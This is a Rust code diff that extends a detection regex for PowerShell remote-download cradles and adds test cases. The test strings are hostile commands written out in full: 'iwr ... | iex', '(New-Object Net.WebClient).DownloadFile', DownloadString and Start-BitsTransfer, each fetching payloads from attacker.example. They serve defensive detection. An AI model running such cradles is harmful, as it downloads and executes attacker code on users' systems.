@@ -22,7 +22,12 @@ pub(crate) static REMOTE_BINARY_PATTERNS: LazyLock<Vec<(&'static str, CompiledPa
             ),
             (
                 "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD",
-                r"(?i)\b(invoke-webrequest|invoke-restmethod|iwr|irm)\b[\s(]+.*(\.ps1|\.exe|\.zip|\.sh|\.py|\.js|\.bat|\.cmd|\.msi|\.pkg|\.dmg|\.deb|\.rpm)",
+                // Covers the cmdlets/aliases (invoke-webrequest/iwr/…) AND the
+                // .NET WebClient methods (downloadstring/downloadfile/…) plus
+                // Start-BitsTransfer — the canonical `(New-Object
+                // Net.WebClient).DownloadFile(url, x.exe)` cradle used no
+                // cmdlet token and evaded the alias-only list.
+                r"(?i)\b(invoke-webrequest|invoke-restmethod|iwr|irm|downloadstring|downloadfile|downloaddata|start-bitstransfer)\b[\s(]+.*(\.ps1|\.exe|\.zip|\.sh|\.py|\.js|\.bat|\.cmd|\.msi|\.pkg|\.dmg|\.deb|\.rpm)",
             ),
         ])
     });
@@ -177,6 +182,9 @@ mod tests {
             "Invoke-RestMethod https://attacker.example/payload.ps1 | iex",
             "iwr https://attacker.example/payload.ps1 | iex",
             "irm(https://attacker.example/payload.ps1) | iex",
+            "(New-Object Net.WebClient).DownloadFile('http://attacker.example/stage2.exe', \"$env:TEMP\\s.exe\")",
+            "$wc.DownloadString('https://attacker.example/payload.ps1')",
+            "Start-BitsTransfer -Source http://attacker.example/x.exe -Destination s.exe",
         ] {
             assert!(
                 matches(
